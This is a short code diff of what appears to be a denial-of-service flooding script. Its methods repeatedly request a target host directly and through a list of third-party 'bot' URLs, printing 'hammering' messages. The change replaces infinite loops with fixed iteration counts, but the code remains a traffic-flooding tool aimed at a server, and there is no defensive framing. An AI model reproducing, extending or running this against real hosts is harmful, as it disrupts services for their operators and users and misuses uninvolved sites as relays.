@@ -77,7 +77,9 @@ w = Queue()
 
 class MyTest(BaseCase):
     def dos(self):
-        while True:
+        # This method sends HTTP requests to the target server.
+        iterations = 10  # Number of iterations to run (adjust as needed)
+        for _ in range(iterations):
             item = q.get()
             self.driver.get(f"http://{host}")
             print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
@@ -85,7 +87,9 @@ class MyTest(BaseCase):
             q.task_done()
 
     def dos2(self):
-        while True:
+        # This method sends HTTP requests to random bot URLs.
+        iterations = 20  # Number of iterations to run (adjust as needed)
+        for _ in range(iterations):
             item = w.get()
             self.driver.get(random.choice(bots) + f"http://{host}")
             print("\033[94mbot is hammering...\033[0m")
